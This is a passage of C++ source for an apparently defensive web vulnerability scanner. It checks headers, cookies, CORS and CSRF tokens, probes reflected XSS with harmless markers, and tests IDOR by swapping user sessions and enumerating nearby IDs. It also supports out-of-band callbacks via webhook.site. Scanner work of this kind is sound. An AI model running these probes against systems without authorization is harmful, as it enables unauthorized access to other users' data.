// Vulnerability engine using Crawler output

#include "vuln_engine.h"
#include "http_client.h"
#include "session_manager.h"
#include "response_analyzer.h"
#include "timing_analyzer.h"
#include "baseline_comparator.h"
#include <algorithm>
#include <regex>
#include <random>
#include <sstream>
#include <string>
#include <vector>
#include <utility>
#include <optional>
#include <iostream>
#include <nlohmann/json.hpp>
#include <set>
#include <filesystem>
#include <map>
#include <chrono>
#include <ctime>
#include <thread>

// Cookie information to report findings on
struct CookieFinding {
    std::string name;
    std::string attribute;
    std::string observed;
    bool missing;
};

VulnEngine::VulnEngine(const HttpClient& client, double confidence_threshold, SessionManager* session_manager)
    : client_(client), confidenceThreshold_(confidence_threshold), riskBudget_(100), session_manager_(session_manager), callback_url_("") {
    // Initialize response analyzer with default patterns
    // Try to load from config file, fall back to defaults if not found
    std::string config_path = "config/response_patterns.yaml";
    if (std::filesystem::exists(config_path)) {
        response_analyzer_ = std::make_unique<ResponseAnalyzer>(config_path);
    } else {
        response_analyzer_ = std::make_unique<ResponseAnalyzer>();
    }
    
    // Initialize timing analyzer
    timing_analyzer_ = std::make_unique<TimingAnalyzer>(client);
    
    // Initialize baseline comparator
    baseline_comparator_ = std::make_unique<BaselineComparator>(client);
}

// Destructor - explicitly defined here so ResponseAnalyzer, TimingAnalyzer, and BaselineComparator
// are fully defined when the unique_ptr destructors are called
VulnEngine::~VulnEngine() = default;

// Set max risk for vulnerabilities
void VulnEngine::setRiskBudget(int max_risk) {
    riskBudget_ = max_risk;
}

// Set callback URL for out-of-band detection
void VulnEngine::setCallbackUrl(const std::string& url) {
    callback_url_ = url;
}

// Generate unique token for callback identification
std::string VulnEngine::generateCallbackToken() const {
    // Use timestamp + random for uniqueness
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count();
    
    // Generate random number
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 9999);
    int random = dis(gen);
    
    return "sentinel_" + std::to_string(timestamp) + "_" + std::to_string(random);
}

// Build callback URL with token appended
std::string VulnEngine::buildCallbackUrl(const std::string& token) const {
    if (callback_url_.empty()) {
        return "";
    }
    
    std::string url = callback_url_;
    
    // Determine if we need to add ? or &
    if (url.find('?') == std::string::npos) {
        // No query string, add ?
        url += "?";
    } else {
        // Query string exists, add &
        if (url.back() != '&' && url.back() != '?') {
            url += "&";
        }
    }
    
    url += "token=" + token;
    return url;
}

// Verify if callback was received (supports webhook.site API)
bool VulnEngine::verifyCallbackReceived(const std::string& token) const {
    if (callback_url_.empty()) {
        return false;
    }
    
    // Check if using webhook.site
    if (callback_url_.find("webhook.site") != std::string::npos) {
        // Extract UUID from webhook.site URL
        // Pattern: https://webhook.site/{uuid}
        size_t last_slash = callback_url_.find_last_of('/');
        if (last_slash != std::string::npos && last_slash < callback_url_.size() - 1) {
            std::string uuid = callback_url_.substr(last_slash + 1);
            // Remove query string if present
            size_t query_pos = uuid.find('?');
            if (query_pos != std::string::npos) {
                uuid = uuid.substr(0, query_pos);
            }
            
            // Query webhook.site API
            std::string api_url = "https://webhook.site/token/" + uuid + "/requests";
            HttpRequest req;
            req.method = "GET";
            req.url = api_url;
            req.headers["Accept"] = "application/json";
            
            HttpResponse resp;
            if (client_.perform(req, resp) && resp.status == 200) {
                try {
                    nlohmann::json requests = nlohmann::json::parse(resp.body);
                    if (requests.is_array()) {
                        // Check each request for our token
                        for (const auto& request : requests) {
                            if (request.contains("query_string")) {
                                std::string query = request["query_string"];
                                if (query.find("token=" + token) != std::string::npos) {
                                    return true;
                                }
                            }
                        }
                    }
                } catch (const std::exception&) {
                    // JSON parse error, fall through to return false
                }
            }
        }
    }
    
    // For non-webhook.site URLs, we can't automatically verify
    // Return false - the finding will include a note for manual verification
    return false;
}

// Helper function to retrieve value if header found, nullopt if not
std::optional<std::string> getHeaderValue(const CrawlResult& s, const std::string& key) {
    for (const auto& [header, value] : s.headers) {
        if (header == key) {
            return value;
        }
    }
    return std::nullopt;
}

// Helper function to convert a string to lowercase for case insensitivity 
static inline std::string toLower(const std::string &s) {
    std::string out = s;
    std::transform(out.begin(), out.end(), out.begin(), [](unsigned char c) { 
        return std::tolower(c);
    });
    return out;
}

// Helper function to trim space for equality checking
static inline std::string trim(const std::string &s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

// Parse set-cookie headers into tokens
std::vector<std::string> parse_cookie_attributes(const std::string &cookie_value) {
    std::vector<std::string> attrs;
    size_t start = 0;
    while (start < cookie_value.size()) {
        size_t semi = cookie_value.find(';', start);
        std::string token = (semi == std::string::npos) ? 
            cookie_value.substr(start) : cookie_value.substr(start, semi - start);
        token = trim(token);
        attrs.push_back(toLower(token));
        if (semi == std::string::npos) break;
        start = semi + 1;
    }
    return attrs;
}

// Helper function to generate a unique marker for a param
static std::string make_marker(const std::string& param) {
    static std::mt19937_64 rng(std::random_device{}());
    uint64_t r = rng();
    std::ostringstream oss;
    oss << "__XSS_MARKER_" << param << "_" << std::hex << r << "__";
    return oss.str();
}

// Helper function to url encode a string
static std::string url_encode(const std::string& s) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    for (auto c : s) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// Helper function to html escape a string
static std::string html_escape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '&': out += "&amp;"; break;
            case '<': out += "&lt;"; break;
            case '>': out += "&gt;"; break;
            case '"': out += "&quot;"; break;
            case '\'': out += "&#39;"; break;
            default: out.push_back(c);
        }
    }
    return out;
}

// Quick check for HTTP response content type
static bool is_html_content_type(const std::map<std::string,std::string>&headers) {
    auto it = headers.find("content-type");
    if (it == headers.end()) return true;
    std::string ct = it->second;
    ct = toLower(ct);
    return ct.find("html") != std::string::npos || ct.find("text/") != std::string::npos;
}

// Quick context classifier: script, attribute, text, json, header
static std::string classify_context(const std::string& body, const std::string& marker) {
    auto pos = body.find(marker);
    if (pos == std::string::npos) return "none";

    size_t start = (pos < 50) ? 0 : pos - 50;
    size_t end = std::min(body.size(), pos + marker.size() + 50);
    std::string window = body.substr(start, end - start);

    std::regex script_rx(R"(<script[^>]*>[^<]*\b)");
    if (std::regex_search(window, std::regex("<script", std::regex::icase)))
        return "script";

    if (std::regex_search(window, std::regex(R"([a-zA-Z0-9_\-]+\s*=\s*["'][^"']*__XSS_MARKER)")))
        return "attribute";

    if (std::regex_search(window, std::regex(R"(["'][^"']+["']\s*:\s*["'][^"']*__XSS_MARKER)")))
        return "json";

    return "text";
}

// Helper function that builds GET URL with replaced param
static std::string build_url_with_param(
        const std::string& base,
        const std::vector<std::pair<std::string,std::string>>& params,
        const std::string& replace_param, const std::string& value
    ) {
    std::ostringstream oss;
    std::string path = base;
    std::string existing_q;
    auto qpos = base.find('?');
    if (qpos != std::string::npos) {
        path = base.substr(0, qpos);
        existing_q = base.substr(qpos + 1);
    }
    oss << path << '?';
    bool first = true;
    for (const auto& p : params) {
        std::string k = p.first;
        std::string v = p.second;
        if (k == replace_param) v = value;
        if (!first) oss << '&';
        oss << k << '=' << url_encode(v);
        first = false;
    }
    // If no params in vector, preserve existing_q
    if (params.empty() && !existing_q.empty()) {
        oss << existing_q;
    }
    return oss.str();
}

// --- Individual checks ---

void VulnEngine::checkSecurityHeaders(const CrawlResult& result, std::vector<Finding>& findings) {
    std::vector<std::string> checks = {
        "x-frame-options",
        "content-security-policy",
        "x-content-type-options",
        "strict-transport-security"
    };

    for (const auto& check : checks) {
        auto valueOpt = getHeaderValue(result, check);
        bool flag = false;
        std::string evidence;

        if (!valueOpt) {
            flag = true;
            evidence = check + " missing";
        }

        if (flag) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.category = "missing_security_header";
            f.method = result.method;
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(), 
                result.headers.end()
            );
            f.evidence = {
                {"header", check},
                {"description", evidence},
                {"observed_value", valueOpt ? "[" + *valueOpt + "]" : "[]"}
            };
            f.severity = "medium"; 
            f.confidence = 0.95;
            f.remediation_id = "headers";
            
            findings.push_back(std::move(f));
        }
    }
}

void VulnEngine::checkCookies(const CrawlResult& result, std::vector<Finding>& findings) {
    std::vector<std::string> cookies ={"secure", "httponly", "samesite"};    
    for (const auto &header : result.headers) {
        if (header.first != "set-cookie") continue;

        auto tokens = parse_cookie_attributes(header.second);
        std::string cookie_name = "[unnamed]";
        if(!tokens.empty()) {
            size_t eq = tokens[0].find('=');
            cookie_name = (eq != std::string::npos) ? tokens[0].substr(0, eq) : tokens[0];
        }

        bool has_secure = false, has_samesite = false, has_httponly = false;
        std::string samesite_val;
        for (size_t i = 1; i < tokens.size(); i++) {
            if (tokens[i].rfind("samesite", 0) == 0) {
                has_samesite = true;
                size_t eq = tokens[i].find('=');
                if (eq != std::string::npos && eq + 1 < tokens[i].size()) {
                    samesite_val = tokens[i].substr(eq + 1);
                }
            } else if (tokens[i] == "httponly") {
                has_httponly = true;
            } else if (tokens[i] == "secure") {
                has_secure = true;
            }
        }

        std::vector<CookieFinding> report;
        if (!has_secure) {
            CookieFinding cf;
            cf.name = cookie_name;
            cf.attribute = "secure";
            cf.missing = true;
            report.push_back(std::move(cf));
        }
        if (!has_httponly) {
            CookieFinding cf;
            cf.name = cookie_name;
            cf.attribute = "httponly";
            cf.missing = true;
            report.push_back(std::move(cf));
        }
        if (!has_samesite) {
            CookieFinding cf;
            cf.name = cookie_name;
            cf.attribute = "samesite";
            cf.missing = true;
            report.push_back(std::move(cf));
        }
        if (
            has_samesite &&
            !samesite_val.empty() &&
            samesite_val != "strict" &&
            samesite_val != "lax" &&
            samesite_val != "none"
        ) {
            // SameSite present but misconfigured
            CookieFinding cf;
            cf.name = cookie_name;
            cf.attribute = "samesite";
            cf.observed = samesite_val;
            cf.missing = false;
            report.push_back(std::move(cf));
        }
        if (has_samesite && !samesite_val.empty() && samesite_val == "none" && !has_secure) {
            // SameSite present, set to None, and missing Secure
            CookieFinding cf;
            cf.name = cookie_name;
            cf.attribute= "samesite";
            cf.observed = samesite_val;
            cf.missing = true;
            report.push_back(std::move(cf));
 
        }
        for (auto item : report) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.category = "unsafe_cookie";
            f.method = result.method;
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
            );
            f.evidence = {
                {"cookie", item.name},
                {"description",
                    (item.missing && item.observed.empty()) ?
                    "Cookie attribute " + item.attribute + " not set" :
                    "Cookie attribute " + item.attribute + " misconfiguration"
                },
                {"observed_value", 
                    (item.missing && item.observed.empty())? 
                    "[]" :
                    "[" + item.observed + "]"
                }
            };
            f.severity = "medium";
            f.confidence = 0.95;
            f.remediation_id = (item.missing && item.observed.empty())?
                "missing_cookie_attribute" :
                "misconfigured_cookie";

            findings.push_back(std::move(f));
        }
    }
}

void VulnEngine::checkCORS(const CrawlResult& result, std::vector<Finding>& findings) {
    auto origin = getHeaderValue(result, "access-control-allow-origin");
    auto creds = getHeaderValue(result, "access-control-allow-credentials");

    std::string desc;
    std::string category;
    double confidence = 0.0;
    std::string severity = "medium";

    if (origin && toLower(*origin) == "*" && creds && toLower(*creds) == "true") {
        desc = "CORS misconfiguration: wildcard origin with credentials enabled";
        category = "cors_combined_misconfig";
        severity = "high";
        confidence = 0.95;
    } else if (origin && toLower(*origin) == "*") {
        desc = "CORS misconfiguration: wildcard Access-Control-Allow-Origin";
        category = "cors_wildcard_origin";
        severity = "medium";
        confidence = 0.90;
    } else if (creds && toLower(*creds) == "true") {
        desc = "CORS misconfiguration: credentials allowed for unspecified origin";
        category = "cors_credentials_enabled";
        severity = "medium";
        confidence = 0.85;
    }

    if (!desc.empty()) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "cors_misconfig";
        f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
        );
        f.evidence = {
            {"description", desc},
            {"Allow-Origin", origin ? "[" + *origin + "]" : "[]"},
            {"Allow-Credentials", creds ? "[" + *creds + "]" : "[]"}
        };
        f.severity = severity;
        f.confidence = confidence;
        f.remediation_id = category;

        findings.push_back(std::move(f));
    }
}

void VulnEngine::checkReflectedXSS(const CrawlResult& result, std::vector<Finding>& findings) {
    if (result.params.empty()) {
        return;
    }
    auto resp_headers_map = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
    );

    for (const auto& [param, orig_value] : result.params) {
        if (param.empty()) continue;
        std::string marker = make_marker(param);
        std::vector<std::pair<std::string,std::string>> variants = {
            {"raw", marker},
            {"url_encoded", url_encode(marker)},
            {"html_escaped", html_escape(marker)}
        };
        bool flag = false;
        double best_conf = 0.0;
        std::string best_desc;
        nlohmann::json best_evidence;
        
        for (const auto& var : variants) {
            const std::string& mode = var.first;
            const std::string& injected = var.second;

            HttpRequest req;
            std::string target_url = result.url;
            req.method = "GET";
            req.url = target_url;
            req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            if (toLower(result.source) == "form" && toLower(result.method) == "post") {
                continue;
            }

            req.url = build_url_with_param(result.url, result.params, param, injected);
            
            // Add session cookies and headers if session manager is available
            enhance_request_with_session(req);

            HttpResponse resp;
            client_.perform(req, resp);

            if (resp.status < 200 || resp.status >= 400) continue;

            if (resp.body.find(injected) != std::string::npos) {
                flag = true;
                std::string context = classify_context(resp.body, injected);

                double confidence = 0.5;
                if (context == "script" || context == "attribute") {
                    confidence = 0.95;
                } else if (context == "text") {
                    confidence = 0.8;
                } else if (context == "json") {
                    confidence = 0.75;
                }

                std::ostringstream desc;
                desc << "Reflected marker found for param '" 
                    << param << "' (mode=" << mode << ", context=" << context << ")";

                nlohmann::json evidence;
                evidence["param"] = param;
                evidence["mode"] = mode;
                evidence["injected"] = injected;
                evidence["context"] = context;
                evidence["status"] = resp.status;
                evidence["response_snippet"] = resp.body.substr(
                        std::max<size_t>(0, (int)resp.body.find(injected) - 60),
                        std::max<size_t>(resp.body.size() - resp.body.find(injected), 100)
                );

                if (confidence > best_conf) {
                    best_conf = confidence;
                    best_desc = desc.str();
                    best_evidence = evidence;
                }
            }
        }

        if (flag) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.category = "reflected_xss";
            f.headers = resp_headers_map;
            f.evidence = best_evidence;
            f.severity = (best_conf > 0.79) ? "high" : "medium";
            f.confidence = best_conf;
            f.remediation_id = "xss";
            std::ostringstream curl;
            std::string curl_url = build_url_with_param(
                    result.url,
                    result.params,
                    param,
                    best_evidence["injected"]
            );
            curl << "curl -i -X GET " << curl_url << "";
            f.evidence["repro_curl"] = curl.str();
            findings.push_back(std::move(f));
        }
    }
}

void VulnEngine::checkCSRF(const CrawlResult& result, std::vector<Finding>& findings) {
    static const std::set<std::string> modifyingMethods = {"post", "put", "delete"};
    if (!modifyingMethods.count(toLower(result.method))) return;

    bool hasToken = false;
    for (const auto&  [param, _] : result.params) {
        std::string lower = toLower(param);
        if (lower.find("csrf") != std::string::npos || lower.find("token") != std::string::npos) {
            hasToken = true;
            break;
        }
    }

    if (!hasToken) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.category = "csrf_missing_token";
        f.headers = std::map<std::string, std::string>(
                result.headers.begin(), 
                result.headers.end()
        );
        f.evidence = {{"method", result.method}, {"description", "No CSRF token found"}};
        f.severity = "medium";
        f.confidence = 0.9;
        f.remediation_id = "csrf";
        findings.push_back(std::move(f));
    }
}

void VulnEngine::checkIDOR(const CrawlResult& result, std::vector<Finding>& findings) {
    // Enhanced IDOR detection requires SessionManager with multiple user sessions
    if (!session_manager_) {
        return;
    }
    
    // Get active sessions - need at least 2 users for IDOR testing
    auto active_sessions = session_manager_->get_active_sessions();
    if (active_sessions.size() < 2) {
        return;
    }
    
    // Identify resource IDs in URL and request body
    struct ResourceID {
        std::string id_value;
        std::string location;  // "url", "param", "body"
        std::string param_name;  // Parameter name if applicable
        bool is_numeric;
        bool is_uuid;
    };
    
    std::vector<ResourceID> resource_ids;
    
    // Extract IDs from URL path (e.g., /api/users/123/profile)
    std::regex url_id_pattern(R"((?:/|^)(\d+)(?:/|$))");  // Numeric IDs in path
    std::regex url_uuid_pattern(R"((?:/|^)([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})(?:/|$))");  // UUIDs
    
    std::smatch url_match;
    std::string url_path = result.url;
    size_t last_slash = url_path.find_last_of('?');
    if (last_slash != std::string::npos) {
        url_path = url_path.substr(0, last_slash);
    }
    
    // Find numeric IDs in URL
    std::string::const_iterator search_start(url_path.cbegin());
    while (std::regex_search(search_start, url_path.cend(), url_match, url_id_pattern)) {
        ResourceID rid;
        rid.id_value = url_match[1].str();
        rid.location = "url";
        rid.is_numeric = true;
        rid.is_uuid = false;
        resource_ids.push_back(rid);
        search_start = url_match.suffix().first;
    }
    
    // Find UUIDs in URL
    search_start = url_path.cbegin();
    while (std::regex_search(search_start, url_path.cend(), url_match, url_uuid_pattern)) {
        ResourceID rid;
        rid.id_value = url_match[1].str();
        rid.location = "url";
        rid.is_numeric = false;
        rid.is_uuid = true;
        resource_ids.push_back(rid);
        search_start = url_match.suffix().first;
    }
    
    // Extract IDs from URL parameters
    for (const auto& [param_name, param_value] : result.params) {
        // Check if parameter value looks like an ID
        if (std::regex_match(param_value, std::regex(R"(\d+)"))) {
            ResourceID rid;
            rid.id_value = param_value;
            rid.location = "param";
            rid.param_name = param_name;
            rid.is_numeric = true;
            rid.is_uuid = false;
            resource_ids.push_back(rid);
        } else if (std::regex_match(param_value, std::regex(R"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"))) {
            ResourceID rid;
            rid.id_value = param_value;
            rid.location = "param";
            rid.param_name = param_name;
            rid.is_numeric = false;
            rid.is_uuid = true;
            resource_ids.push_back(rid);
        }
    }
    
    // Extract IDs from request body (if POST/PUT)
    // For POST/PUT, construct body from params if available
    if ((result.method == "POST" || result.method == "PUT") && !result.params.empty()) {
        // Try to construct JSON body from params
        try {
            nlohmann::json body_json;
            for (const auto& [key, value] : result.params) {
                body_json[key] = value;
            }
            std::string body_str = body_json.dump();
            std::function<void(const nlohmann::json&, const std::string&)> extract_ids = 
                [&](const nlohmann::json& obj, const std::string& prefix) {
                    if (obj.is_object()) {
                        for (auto it = obj.begin(); it != obj.end(); ++it) {
                            std::string key = it.key();
                            std::string full_key = prefix.empty() ? key : prefix + "." + key;
                            
                            // Check if key suggests an ID field
                            std::string lower_key = key;
                            std::transform(lower_key.begin(), lower_key.end(), lower_key.begin(), ::tolower);
                            if (lower_key.find("id") != std::string::npos || 
                                lower_key.find("user_id") != std::string::npos ||
                                lower_key.find("account_id") != std::string::npos ||
                                lower_key.find("order_id") != std::string::npos) {
                                
                                if (it.value().is_string()) {
                                    std::string val = it.value().get<std::string>();
                                    if (std::regex_match(val, std::regex(R"(\d+)"))) {
                                        ResourceID rid;
                                        rid.id_value = val;
                                        rid.location = "body";
                                        rid.param_name = full_key;
                                        rid.is_numeric = true;
                                        rid.is_uuid = false;
                                        resource_ids.push_back(rid);
                                    } else if (std::regex_match(val, std::regex(R"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"))) {
                                        ResourceID rid;
                                        rid.id_value = val;
                                        rid.location = "body";
                                        rid.param_name = full_key;
                                        rid.is_numeric = false;
                                        rid.is_uuid = true;
                                        resource_ids.push_back(rid);
                                    }
                                } else if (it.value().is_number()) {
                                    ResourceID rid;
                                    rid.id_value = std::to_string(it.value().get<int>());
                                    rid.location = "body";
                                    rid.param_name = full_key;
                                    rid.is_numeric = true;
                                    rid.is_uuid = false;
                                    resource_ids.push_back(rid);
                                }
                            }
                            
                            if (it.value().is_object() || it.value().is_array()) {
                                extract_ids(it.value(), full_key);
                            }
                        }
                    } else if (obj.is_array()) {
                        for (size_t i = 0; i < obj.size(); ++i) {
                            extract_ids(obj[i], prefix + "[" + std::to_string(i) + "]");
                        }
                    }
                };
            extract_ids(body_json, "");
        } catch (...) {
            // Not JSON, skip body parsing
        }
    }
    
    if (resource_ids.empty()) {
        return;  // No resource IDs found to test
    }
    
    // Use first user as "User A" (resource owner)
    // Use second user as "User B" (attacker trying to access User A's resources)
    std::string user_a = active_sessions[0];
    std::string user_b = active_sessions[1];
    
    // Get baseline response with User A's session (legitimate access)
    HttpRequest baseline_req;
    baseline_req.method = result.method;
    baseline_req.url = result.url;
    baseline_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add User A's session
    auto user_a_cookies = session_manager_->get_cookies(user_a);
    if (!user_a_cookies.empty()) {
        std::string cookie_header = HttpClient::build_cookie_header(user_a_cookies);
        if (!cookie_header.empty()) {
            baseline_req.headers["Cookie"] = cookie_header;
        }
    }
    auto user_a_headers = session_manager_->get_auth_headers(user_a);
    for (const auto& [key, value] : user_a_headers) {
        baseline_req.headers[key] = value;
    }
    
    // Add POST/PUT body if applicable (construct from params)
    if (result.method == "POST" || result.method == "PUT") {
        if (!result.params.empty()) {
            // Construct form-encoded body from params
            std::ostringstream body_stream;
            bool first = true;
            for (const auto& [key, value] : result.params) {
                if (!first) body_stream << "&";
                body_stream << key << "=" << value;
                first = false;
            }
            baseline_req.body = body_stream.str();
        }
    }
    
    HttpResponse baseline_resp;
    if (!client_.perform(baseline_req, baseline_resp)) {
        return;  // Can't establish baseline
    }
    
    // Skip if baseline is an error (403, 404, 500, etc.)
    if (baseline_resp.status >= 400) {
        return;  // User A can't access their own resource, skip IDOR test
    }
    
    // Test each resource ID
    for (const auto& resource_id : resource_ids) {
        // Create test request with User B's session (unauthorized access attempt)
        HttpRequest test_req;
        test_req.method = result.method;
        test_req.url = result.url;
        test_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        
        // Add User B's session
        auto user_b_cookies = session_manager_->get_cookies(user_b);
        if (!user_b_cookies.empty()) {
            std::string cookie_header = HttpClient::build_cookie_header(user_b_cookies);
            if (!cookie_header.empty()) {
                test_req.headers["Cookie"] = cookie_header;
            }
        }
        auto user_b_headers = session_manager_->get_auth_headers(user_b);
        for (const auto& [key, value] : user_b_headers) {
            test_req.headers[key] = value;
        }
        
        // Modify the resource ID in the request
        if (resource_id.location == "url") {
            // Replace ID in URL path
            std::string test_url = result.url;
            if (resource_id.is_numeric) {
                // Replace numeric ID
                test_url = std::regex_replace(test_url, std::regex(R"((?:/|^)\d+(?:/|$))"), 
                    "/" + resource_id.id_value + "/");
            } else if (resource_id.is_uuid) {
                // Replace UUID
                std::regex uuid_regex(R"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})");
                test_url = std::regex_replace(test_url, uuid_regex, resource_id.id_value);
            }
            test_req.url = test_url;
        } else if (resource_id.location == "param") {
            // Modify parameter value
            test_req.url = build_url_with_param(result.url, result.params, resource_id.param_name, resource_id.id_value);
        } else if (resource_id.location == "body") {
            // Modify body (for POST/PUT) - construct from params
            if (!result.params.empty()) {
                // Try to construct JSON body from params
                try {
                    nlohmann::json body_json;
                    for (const auto& [key, value] : result.params) {
                        body_json[key] = value;
                    }
                    // Simple replacement - would need more sophisticated JSON path handling
                    std::string body_str = body_json.dump();
                    std::string search_pattern = "\"" + resource_id.param_name + "\"";
                    size_t pos = body_str.find(search_pattern);
                    if (pos != std::string::npos) {
                        // Find the value after the key
                        size_t value_start = body_str.find(':', pos);
                        if (value_start != std::string::npos) {
                            size_t value_end = body_str.find_first_of(",}", value_start);
                            if (value_end != std::string::npos) {
                                std::string new_body = body_str.substr(0, value_start + 1) + 
                                    "\"" + resource_id.id_value + "\"" + 
                                    body_str.substr(value_end);
                                test_req.body = new_body;
                            } else {
                                test_req.body = body_str;
                            }
                        } else {
                            test_req.body = body_str;
                        }
                    } else {
                        // Pattern not found, use JSON as-is (might be nested)
                        test_req.body = body_str;
                    }
            } catch (...) {
                // Fallback to form-encoded body if JSON parsing fails
                std::ostringstream body_stream;
                bool first = true;
                for (const auto& [key, value] : result.params) {
                    if (!first) body_stream << "&";
                    if (key == resource_id.param_name) {
                        body_stream << key << "=" << resource_id.id_value;
                    } else {
                        body_stream << key << "=" << value;
                    }
                    first = false;
                }
                test_req.body = body_stream.str();
            }
            } else {
                // No params, can't construct body
            }
        }
        
        HttpResponse test_resp;
        if (!client_.perform(test_req, test_resp)) {
            continue;
        }
        
        // Check for successful unauthorized access
        bool indicates_idor = false;
        double idor_confidence = 0.0;
        std::string detection_method = "";
        
        // 1. Check status code - if User B gets 200 OK, that's suspicious
        if (test_resp.status == 200 && baseline_resp.status == 200) {
            // Both got 200, need to check if content is different
            if (baseline_comparator_) {
                ComparisonResult comparison = baseline_comparator_->compare(baseline_resp, test_resp);
                
                // If content is similar (same data), that indicates IDOR
                // If content is different, might be different users' data (also IDOR)
                if (comparison.similarity_score > 0.8) {
                    // Very similar content - User B accessed User A's data
                    indicates_idor = true;
                    idor_confidence = 0.95;
                    detection_method = "content_similarity";
                } else if (comparison.similarity_score < 0.3 && test_resp.status == 200) {
                    // Different content but still 200 - User B accessed different data (also IDOR)
                    indicates_idor = true;
                    idor_confidence = 0.85;
                    detection_method = "content_difference";
                }
            } else {
                // No baseline comparator, but both got 200 - suspicious
                indicates_idor = true;
                idor_confidence = 0.75;
                detection_method = "status_code";
            }
        } else if (test_resp.status == 200 && baseline_resp.status != 200) {
            // User B got 200 but User A didn't - definitely IDOR
            indicates_idor = true;
            idor_confidence = 0.98;
            detection_method = "status_code_anomaly";
        }
        
        // 2. Check if User B got 403/404 (proper authorization) - no IDOR
        if (test_resp.status == 403 || test_resp.status == 404) {
            // Proper authorization check - no IDOR
            continue;
        }
        
        if (indicates_idor && idor_confidence >= confidenceThreshold_) {
            Finding f;
            f.id = "idor_" + resource_id.id_value;
            f.url = test_req.url;
            f.method = test_req.method;
            f.category = "idor";
            
            nlohmann::json evidence;
            evidence["resource_id"] = resource_id.id_value;
            evidence["resource_id_location"] = resource_id.location;
            evidence["resource_id_type"] = resource_id.is_numeric ? "numeric" : (resource_id.is_uuid ? "uuid" : "unknown");
            evidence["user_a"] = user_a;
            evidence["user_b"] = user_b;
            evidence["detection_method"] = detection_method;
            evidence["baseline_status"] = baseline_resp.status;
            evidence["test_status"] = test_resp.status;
            evidence["baseline_length"] = baseline_resp.body.length();
            evidence["test_length"] = test_resp.body.length();
            
            if (baseline_comparator_) {
                ComparisonResult comparison = baseline_comparator_->compare(baseline_resp, test_resp);
                evidence["similarity_score"] = comparison.similarity_score;
                evidence["length_difference"] = comparison.length_difference;
                evidence["length_change_percentage"] = comparison.length_change_percentage;
            }
            
            // Add response snippets
            std::string baseline_snippet = baseline_resp.body.substr(0, 200);
            if (baseline_resp.body.length() > 200) baseline_snippet += "...";
            evidence["baseline_snippet"] = baseline_snippet;
            
            std::string test_snippet = test_resp.body.substr(0, 200);
            if (test_resp.body.length() > 200) test_snippet += "...";
            evidence["test_snippet"] = test_snippet;
            
            f.evidence = evidence;
            f.severity = "high";
            f.confidence = idor_confidence;
            f.remediation_id = "idor";
            
            findings.push_back(std::move(f));
        }
    }
    
    // Test ID enumeration (numeric IDs)
    for (const auto& resource_id : resource_ids) {
        if (!resource_id.is_numeric) {
            continue;  // Skip non-numeric IDs for enumeration
        }
        
        // Try a few sequential IDs
        try {
            int base_id = std::stoi(resource_id.id_value);
            std::vector<int> test_ids = {base_id - 1, base_id + 1, base_id + 2};
            
            for (int test_id : test_ids) {
                if (test_id < 1) continue;  // Skip negative/zero IDs
                
                // Create request with User B's session
                HttpRequest enum_req;
                enum_req.method = result.method;
                enum_req.url = result.url;
                enum_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                
                // Add User B's session
                auto user_b_cookies = session_manager_->get_cookies(user_b);
                if (!user_b_cookies.empty()) {
                    std::string cookie_header = HttpClient::build_cookie_header(user_b_cookies);
                    if (!cookie_header.empty()) {
                        enum_req.headers["Cookie"] = cookie_header;
                    }
                }
                auto user_b_headers = session_manager_->get_auth_headers(user_b);
                for (const auto& [key, value] : user_b_headers) {
                    enum_req.headers[key] = value;
                }
                
                // Replace ID with test ID
                std::string test_id_str = std::to_string(test_id);
                if (resource_id.location == "url") {
                    enum_req.url = std::regex_replace(result.url, std::regex(R"((?:/|^)\d+(?:/|$))"), 
                        "/" + test_id_str + "/");
                } else if (resource_id.location == "param") {
                    enum_req.url = build_url_with_param(result.url, result.params, resource_id.param_name, test_id_str);
                }
                
                HttpResponse enum_resp;
                if (!client_.perform(enum_req, enum_resp)) {
                    continue;
                }
                
                // Check if enumeration was successful (200 OK)
                if (enum_resp.status == 200) {
                    // Compare with baseline to see if it's different data
                    if (baseline_comparator_) {
                        ComparisonResult comparison = baseline_comparator_->compare(baseline_resp, enum_resp);
                        
                        if (comparison.similarity_score < 0.7) {
                            // Different content - enumeration successful
                            Finding f;
                            f.id = "idor_enumeration_" + test_id_str;
                            f.url = enum_req.url;
                            f.method = enum_req.method;
